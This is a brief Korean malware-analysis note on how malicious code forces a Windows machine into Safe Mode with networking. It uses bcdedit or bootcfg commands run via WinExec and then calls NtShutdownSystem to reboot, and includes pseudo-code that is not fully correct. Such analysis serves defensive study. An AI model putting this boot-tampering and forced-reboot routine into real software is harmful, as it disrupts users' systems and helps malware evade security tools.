### Concept

악성 코드가 시스템을 강제로 종료시키는 경우가 존재.
Safeboot를 사용하기 위해 bootcfg 혹은 bcdedit을 수정하고 시스템을 종료.

### Code Flow

1. os 버전 확인
2. safe boot 여부에 따라 cmdline 구성
3. WinExec를 사용하여 cmdline 적용
4. NtShutdownSystem을 호출

### NtShutdownSystem

```c++
NTSTATUS NtShutdownSystem(
	IN SHUTDOWN_ACTION      _Action_
);
```

#### SHUTDOWN_ACTION

```c++
typedef enum _SHUTDOWN_ACTION {
    ShutdownNoReboot
    ShutdownReboot
    ShutdownPowerOff
} SHUTDOWN_ACTION, *PSHUTDOWN_ACTION;
```

### Example

```c++
if (os_flag < "Windows Vista") {
    if (safeboot_flag == 0x0) {
      cmdline = "bootcfg /raw /fastdetect /id 1";
    }
    else {
      cmdline = "bootcfg /raw /a /safeboot:network /id 1";
    }
} else {
	if (safeboot_flag == 0x0) {
	    cmdline = "bcdedit /deletevalue {current} safeboot";
	} else {
	    cmdline = "bcdedit /set {current} safeboot network";
	}
}

if (is_64bit != 0x0) {
      RtlWow64EnableFsRedirectionEx(0x1, &old_value);
}
WinExec(cmdline, 0x0);
Sleep(300);
if (is_64bit != 0x0) {
      RtlWow64EnableFsRedirectionEx(old_value, &old_value);
}

NtShutdownSystem(ShutdownReboot);
```